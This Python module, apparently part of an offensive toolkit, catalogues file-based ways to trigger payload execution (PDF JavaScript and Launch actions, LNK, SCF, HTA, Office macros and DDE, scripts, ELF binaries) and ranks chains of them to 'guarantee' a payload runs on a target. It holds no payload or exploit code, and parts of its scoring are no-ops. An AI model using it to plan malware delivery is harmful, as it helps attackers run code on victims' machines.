#!/usr/bin/env python3
"""
Guarantee Chainer - Chains execution methods for maximum coverage
==================================================================
Creates execution chains that guarantee payload execution across diverse
system configurations by chaining feasible methods together.

Features:
- Intelligent method chaining
- Feasibility validation
- Circular dependency detection
- Success probability calculation
- Chain optimization
- Comprehensive logging

Author: SWORDIntel
Date: 2025-11-15
"""

import os
import sys
import json
from typing import List, Dict, Any, Optional, Set, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
from pathlib import Path

# Add tools to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from tui_helper import TUI, Colors


class ChainFeasibility(Enum):
    """Feasibility ratings for method chaining"""
    EXCELLENT = 5  # Perfect compatibility
    GOOD = 4       # Well-supported
    FAIR = 3       # Works but with caveats
    POOR = 2       # Limited compatibility
    INCOMPATIBLE = 1  # Cannot be chained


@dataclass
class ExecutionMethodInfo:
    """Information about an execution method for chaining"""
    method_id: str
    name: str
    platform: str
    reliability: int
    requirements: List[str]
    triggers_execution: bool
    can_chain_after: List[str]
    output_type: str  # 'file', 'process', 'memory', etc.


@dataclass
class ChainLink:
    """Single link in an execution chain"""
    position: int
    method_id: str
    method_name: str
    platform: str
    reliability: int
    success_probability: float
    feasibility_score: float
    trigger_method: str  # How this is triggered
    output_file: Optional[str] = None


@dataclass
class ExecutionChain:
    """Complete execution chain"""
    chain_id: str
    links: List[ChainLink]
    total_success_probability: float
    platforms_supported: List[str]
    requirements: Set[str]
    is_circular: bool
    optimized: bool
    coverage_score: float


class GuaranteeChainer:
    """Chains execution methods for maximum payload coverage"""

    def __init__(self, tui: Optional[TUI] = None, available_methods: Optional[Dict[str, Any]] = None):
        """
        Initialize guarantee chainer

        Args:
            tui: TUI instance for output
            available_methods: Dict of available execution methods
        """
        self.tui = tui if tui else TUI()
        self.available_methods = available_methods or {}
        self.method_info = self._extract_method_info()
        self.feasibility_matrix = self._build_feasibility_matrix()
        self.chains = []

    def _extract_method_info(self) -> Dict[str, ExecutionMethodInfo]:
        """
        Extract method information for chaining analysis

        Returns:
            Dict of method ID -> ExecutionMethodInfo
        """
        info = {}

        # Method compatibility mapping
        method_metadata = {
            'pdf_autoexec': ExecutionMethodInfo(
                method_id='pdf_autoexec',
                name='PDF OpenAction JavaScript',
                platform='cross',
                reliability=4,
                requirements=['pdf_reader'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'pdf_launch': ExecutionMethodInfo(
                method_id='pdf_launch',
                name='PDF Launch Action',
                platform='cross',
                reliability=4,
                requirements=['pdf_reader'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'html_onload': ExecutionMethodInfo(
                method_id='html_onload',
                name='HTML onload Event',
                platform='cross',
                reliability=3,
                requirements=['browser'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'lnk_shortcut': ExecutionMethodInfo(
                method_id='lnk_shortcut',
                name='Windows LNK Shortcut',
                platform='windows',
                reliability=5,
                requirements=['windows'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'scf_file': ExecutionMethodInfo(
                method_id='scf_file',
                name='Windows SCF Shell Command File',
                platform='windows',
                reliability=4,
                requirements=['windows', 'explorer'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'hta_application': ExecutionMethodInfo(
                method_id='hta_application',
                name='Windows HTA HTML Application',
                platform='windows',
                reliability=4,
                requirements=['windows', 'mshta'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'vbs_script': ExecutionMethodInfo(
                method_id='vbs_script',
                name='Windows VBScript',
                platform='windows',
                reliability=5,
                requirements=['windows', 'cscript'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'batch_file': ExecutionMethodInfo(
                method_id='batch_file',
                name='Windows Batch File',
                platform='windows',
                reliability=5,
                requirements=['windows', 'cmd'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'powershell_ps1': ExecutionMethodInfo(
                method_id='powershell_ps1',
                name='Windows PowerShell Script',
                platform='windows',
                reliability=4,
                requirements=['windows', 'powershell'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'bash_shebang': ExecutionMethodInfo(
                method_id='bash_shebang',
                name='Linux/Unix Bash Shebang',
                platform='linux',
                reliability=5,
                requirements=['linux', 'bash'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'python_shebang': ExecutionMethodInfo(
                method_id='python_shebang',
                name='Python Shebang',
                platform='cross',
                reliability=4,
                requirements=['python'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'desktop_file': ExecutionMethodInfo(
                method_id='desktop_file',
                name='Linux XDG Desktop File',
                platform='linux',
                reliability=4,
                requirements=['linux', 'xdg'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'elf_binary': ExecutionMethodInfo(
                method_id='elf_binary',
                name='ELF Binary',
                platform='linux',
                reliability=5,
                requirements=['linux', 'elf_support'],
                triggers_execution=True,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'office_macro': ExecutionMethodInfo(
                method_id='office_macro',
                name='Office Macro (VBA)',
                platform='windows',
                reliability=4,
                requirements=['office'],
                triggers_execution=False,  # Requires user action
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
            'office_dde': ExecutionMethodInfo(
                method_id='office_dde',
                name='Office DDE (Dynamic Data Exchange)',
                platform='windows',
                reliability=3,
                requirements=['office'],
                triggers_execution=False,
                can_chain_after=['any_file_drop'],
                output_type='process'
            ),
        }

        return method_metadata

    def _build_feasibility_matrix(self) -> Dict[str, Dict[str, int]]:
        """
        Build a matrix of method chaining feasibility

        Returns:
            Dict mapping (method1 -> method2) to feasibility score
        """
        matrix = {}
        methods = list(self.method_info.values())

        for from_method in methods:
            for to_method in methods:
                if from_method.method_id == to_method.method_id:
                    continue

                score = self._calculate_feasibility(from_method, to_method)
                key = f"{from_method.method_id}->{to_method.method_id}"
                matrix[key] = score

        return matrix

    def _calculate_feasibility(self, from_method: ExecutionMethodInfo,
                               to_method: ExecutionMethodInfo) -> int:
        """
        Calculate feasibility of chaining from_method -> to_method

        Args:
            from_method: Source execution method
            to_method: Target execution method

        Returns:
            Feasibility score (1-5)
        """
        score = 3  # Start with FAIR

        # Platform compatibility
        if from_method.platform == to_method.platform:
            score += 1
        elif from_method.platform == 'cross' or to_method.platform == 'cross':
            score += 0
        else:
            score -= 2  # Different platforms

        # Output type compatibility
        if from_method.output_type == 'process' and to_method.triggers_execution:
            score += 1

        # Requirement compatibility
        shared_reqs = set(from_method.requirements) & set(to_method.requirements)
        if shared_reqs:
            score += 0  # Shared requirements help

        # File-based chaining
        if from_method.output_type == 'file' and to_method.triggers_execution:
            score += 1

        # Clamp score to valid range
        return max(1, min(5, score))

    def create_guarantee_chain(self, methods: Optional[List[str]] = None,
                              max_chain_length: int = 10) -> Optional[ExecutionChain]:
        """
        Create an optimal guarantee chain from available methods

        Args:
            methods: List of method IDs to consider (None = all)
            max_chain_length: Maximum methods to chain

        Returns:
            ExecutionChain or None if no viable chain
        """
        self.tui.section("GUARANTEE Chain Generation")
        self.tui.info(f"Building optimal execution chain (max {max_chain_length} methods)...")
        print()

        if methods is None:
            methods = list(self.method_info.keys())

        chain = ExecutionChain(
            chain_id=self._generate_chain_id(),
            links=[],
            total_success_probability=1.0,
            platforms_supported=[],
            requirements=set(),
            is_circular=False,
            optimized=False,
            coverage_score=0.0
        )

        # Sort methods by reliability (highest first)
        sorted_methods = sorted(
            methods,
            key=lambda m: self.method_info[m].reliability if m in self.method_info else 0,
            reverse=True
        )

        used_methods: Set[str] = set()
        current_position = 0

        # Build chain greedily
        for method_id in sorted_methods:
            if current_position >= max_chain_length:
                break

            if method_id in used_methods:
                continue

            if method_id not in self.method_info:
                continue

            method_info = self.method_info[method_id]

            # Check if this method can follow the previous one
            if chain.links:
                last_method_id = chain.links[-1].method_id
                feasibility_key = f"{last_method_id}->{method_id}"
                feasibility = self.feasibility_matrix.get(feasibility_key, ChainFeasibility.POOR.value)

                if feasibility < ChainFeasibility.FAIR.value:
                    continue
            else:
                feasibility = ChainFeasibility.GOOD.value

            # Create chain link
            link = ChainLink(
                position=current_position,
                method_id=method_id,
                method_name=method_info.name,
                platform=method_info.platform,
                reliability=method_info.reliability,
                success_probability=self._calculate_success_probability(method_info),
                feasibility_score=feasibility / 5.0,
                trigger_method='user_action' if not method_info.triggers_execution else 'auto',
            )

            chain.links.append(link)
            used_methods.add(method_id)
            current_position += 1

            # Update chain properties
            chain.total_success_probability *= link.success_probability
            if method_info.platform != 'cross':
                if method_info.platform not in chain.platforms_supported:
                    chain.platforms_supported.append(method_info.platform)
            chain.requirements.update(method_info.requirements)

        # Check for circularity
        chain.is_circular = self._check_circular_dependency(chain)

        # Calculate coverage score
        chain.coverage_score = self._calculate_coverage_score(chain)

        # Optimize chain
        chain = self._optimize_chain(chain)

        # Log results
        self.tui.success(f"Chain created with {len(chain.links)} method(s)")
        self.tui.list_item(f"Success probability: {chain.total_success_probability:.2%}", level=0)
        self.tui.list_item(f"Coverage score: {chain.coverage_score:.2f}", level=0)
        self.tui.list_item(f"Platforms: {', '.join(chain.platforms_supported) if chain.platforms_supported else 'cross-platform'}", level=0)
        print()

        return chain

    def _calculate_success_probability(self, method_info: ExecutionMethodInfo) -> float:
        """
        Calculate success probability for a method

        Args:
            method_info: Method information

        Returns:
            Probability (0.0 - 1.0)
        """
        # Convert reliability (1-5) to probability
        base_prob = {
            5: 0.95,
            4: 0.75,
            3: 0.50,
            2: 0.25,
            1: 0.10
        }
        return base_prob.get(method_info.reliability, 0.5)

    def _check_circular_dependency(self, chain: ExecutionChain) -> bool:
        """
        Check if chain contains circular dependencies

        Args:
            chain: ExecutionChain to check

        Returns:
            True if circular dependency found
        """
        method_ids = [link.method_id for link in chain.links]
        return len(method_ids) != len(set(method_ids))

    def _calculate_coverage_score(self, chain: ExecutionChain) -> float:
        """
        Calculate coverage score for the chain

        Args:
            chain: ExecutionChain

        Returns:
            Coverage score (0.0 - 10.0)
        """
        score = 0.0

        # Number of methods (max 10 points)
        score += min(10.0, len(chain.links) * 1.5)

        # Platform coverage (max 5 points)
        score += len(chain.platforms_supported) * 0.5

        # Reliability average (max 5 points)
        if chain.links:
            avg_reliability = sum(link.reliability for link in chain.links) / len(chain.links)
            score += (avg_reliability / 5.0) * 5.0

        return score

    def _optimize_chain(self, chain: ExecutionChain) -> ExecutionChain:
        """
        Optimize chain for better execution flow

        Args:
            chain: ExecutionChain to optimize

        Returns:
            Optimized ExecutionChain
        """
        # Sort by feasibility score
        chain.links.sort(key=lambda x: x.feasibility_score * x.success_probability, reverse=True)

        # Recalculate positions
        for i, link in enumerate(chain.links):
            link.position = i

        # Recalculate total probability
        chain.total_success_probability = 1.0
        for link in chain.links:
            chain.total_success_probability *= link.success_probability

        chain.optimized = True
        return chain

    def _generate_chain_id(self) -> str:
        """Generate unique chain ID"""
        import time
        import random
        timestamp = int(time.time())
        random_part = random.randint(1000, 9999)
        return f"CHAIN_{timestamp}_{random_part}"

    def get_chain_summary(self, chain: ExecutionChain) -> Dict[str, Any]:
        """
        Get a summary of the chain

        Args:
            chain: ExecutionChain

        Returns:
            Dict with chain summary
        """
        return {
            'chain_id': chain.chain_id,
            'method_count': len(chain.links),
            'success_probability': f"{chain.total_success_probability:.2%}",
            'coverage_score': f"{chain.coverage_score:.2f}/10.0",
            'platforms': chain.platforms_supported,
            'requirements': list(chain.requirements),
            'is_circular': chain.is_circular,
            'optimized': chain.optimized,
            'methods': [
                {
                    'position': link.position,
                    'name': link.method_name,
                    'platform': link.platform,
                    'reliability': link.reliability,
                    'probability': f"{link.success_probability:.2%}",
                    'trigger': link.trigger_method
                }
                for link in chain.links
            ]
        }

    def export_chain_json(self, chain: ExecutionChain, output_file: str) -> bool:
        """
        Export chain to JSON file

        Args:
            chain: ExecutionChain to export
            output_file: Output file path

        Returns:
            True if successful
        """
        try:
            with open(output_file, 'w') as f:
                json.dump(self.get_chain_summary(chain), f, indent=2)
            return True
        except Exception as e:
            self.tui.error(f"Failed to export chain: {e}")
            return False
